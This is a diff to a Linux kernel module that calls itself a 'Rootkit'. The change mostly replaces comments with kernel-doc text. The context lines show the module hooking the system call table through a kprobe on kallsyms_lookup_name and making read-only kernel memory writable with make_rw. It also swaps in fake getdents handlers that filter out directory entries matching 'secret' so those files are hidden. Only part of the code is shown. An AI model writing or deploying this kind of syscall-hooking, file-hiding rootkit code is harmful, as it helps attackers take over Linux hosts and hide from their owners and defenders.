@@ -14,10 +14,10 @@ MODULE_AUTHOR("Parth Thakkar");
 MODULE_DESCRIPTION("Rootkit");
 MODULE_LICENSE("GPL");
 
-
 #define HIDE_FILE "secret"
 
-
+// Structure definitions for directory entries
+// These structures are used to manipulate directory listing data
 
 // struct linux_dirent {
 //                unsigned long  d_ino;     /* Inode number */
@@ -32,8 +32,6 @@ MODULE_LICENSE("GPL");
 //                                          // 2.6.4); offset is (d_reclen - 1)
 //                */
 //            }
-
-
 
 struct linux_dirent {
 	unsigned long	d_ino;
@@ -50,10 +48,12 @@ struct linux_dirent64 {
 	char		d_name[];
 };
 
+// Kprobe structure for finding kallsyms_lookup_name
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
 };
 
+// Function pointers to store original system call implementations
 asmlinkage long (*original_getdents64)(int fd, struct linux_dirent64 * dirp, unsigned int count);
 asmlinkage long (*original_getdents)(int fd, struct linux_dirent * dirp, unsigned int count);
 asmlinkage int (*original_sys_exit)(int);
@@ -61,32 +61,15 @@ asmlinkage int (*original_sys_exit)(int);
 uint8_t was_writable = 0;
 void **sys_call_table_addr = (void *)0xffffffff88400280;
 
-
-// referanc https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
-/* needed for hooking */
-// static inline void
-// write_cr0_forced(unsigned long val)
-// {
-//     unsigned long __force_order;
-
-//     /* __asm__ __volatile__( */
-//     asm volatile(
-//         "mov %0, %%cr0"
-//         : "+r"(val), "+m"(__force_order)); // force order is clobber which tells comiler that memory is changed, dont mess with the sequence and mess the order while optimizing;
-// }
-
-// static inline void
-// protect_memory(void)
-// {
-//     write_cr0_forced(cr0);
-// }
-
-// static inline void
-// unprotect_memory(void)
-// {
-//     write_cr0_forced(cr0 & ~0x00010000);
-// }
-
+/**
+ * make_rw - Make a memory page writable
+ * @address: The address of the memory to make writable
+ *
+ * This function modifies the page table entry to make a given memory address writable.
+ * It's used to allow modifications to normally read-only kernel memory.
+ *
+ * Return: 1 if the page was made writable, 0 if it was already writable
+ */
 static int make_rw(unsigned long address){
 
     // &level: A pointer to an integer. After the function call, this integer will contain:
@@ -146,13 +129,13 @@ static int make_rw(unsigned long address){
 
 }
 
-
-// Access control: Only affects kernel-mode accesses; user-mode accesses are still restricted by PTE permissions.
-
-// WP Write Protect (bit 16 of CR0) — When set, inhibits supervisor-level procedures from writing into readonly pages; when clear, allows supervisor-level 
-// procedures to write into read-only pages (regardless of the U/S bit setting; see Section 4.1.3 and Section 4.6). This flag facilitates implementation of the
-// copy-on-write method of creating a new process (forking) used by operating systems such as UNIX.
-
+/**
+ * make_ro - Make a memory page read-only
+ * @address: The address of the memory to make read-only
+ *
+ * This function modifies the page table entry to make a given memory address read-only.
+ * It's used to restore the normal protection of kernel memory after modifications.
+ */
 static void make_ro(unsigned long address){
 
     unsigned int level;
@@ -164,19 +147,49 @@ static void make_ro(unsigned long address){
 
 }
 
+/**
+ * custom_sys_exit - Custom implementation of sys_exit
+ * @error_no: The exit status
+ *
+ * This function intercepts the sys_exit system call, logs the exit code,
+ * and then calls the original sys_exit function.
+ *
+ * Return: The return value of the original sys_exit call
+ */
 asmlinkage int custom_sys_exit(int error_no){
     printk("HEY! sys_exit called with error_code=%d\n", error_no);
     /*call the original sys_exit*/
     return original_sys_exit(error_no);
 }
 
-
+/**
+ * fake_getdents64 - Custom implementation of getdents64
+ * @fd: File descriptor of the directory
+ * @dirp: Pointer to the linux_dirent64 structure
+ * @count: Number of bytes to read
+ *
+ * This function intercepts the getdents64 system call. Currently, it just logs
+ * the call and passes it through to the original function.
+ *
+ * Return: The number of bytes read or an appropriate error code
+ */
 asmlinkage long fake_getdents64(int fd, struct linux_dirent64 * dirp, unsigned int count) {
     printk("Fake getdents64 called \n");
     
     return original_getdents64(fd, dirp, count);
 }
 
+/**
+ * fake_getdents - Custom implementation of getdents
+ * @fd: File descriptor of the directory
+ * @original_dir_entry: Pointer to the linux_dirent structure
+ * @count: Number of bytes to read
+ *
+ * This function intercepts the getdents system call and filters out entries
+ * containing the HIDE_FILE string. It's used to hide specific files or directories.
+ *
+ * Return: The number of bytes read or an appropriate error code
+ */
 asmlinkage long fake_getdents(int fd, struct linux_dirent * original_dir_entry, unsigned int count) {
     printk("Fake getdents called \n");
     struct linux_dirent *rootkit_dir_entry_structure;
@@ -234,8 +247,14 @@ asmlinkage long fake_getdents(int fd, struct linux_dirent * original_dir_entry, 
     return nbytes;
 }
 
-
-
+/**
+ * custom_init - Initialization function for the rootkit
+ *
+ * This function is called when the module is loaded. It resolves the address
+ * of the system call table and hooks the target system calls.
+ *
+ * Return: 0 on success, negative error code on failure
+ */
 static int __init custom_init(void)
 {
     int ret = 0;
@@ -279,7 +298,12 @@ static int __init custom_init(void)
     return ret;
 }
 
-
+/**
+ * custom_exit - Cleanup function for the rootkit
+ *
+ * This function is called when the module is unloaded. It restores the original
+ * system calls and cleans up any resources used by the rootkit.
+ */
 static void __exit custom_exit(void){
     // sys_call_table[__NR_exit] = original_sys_exit;
 
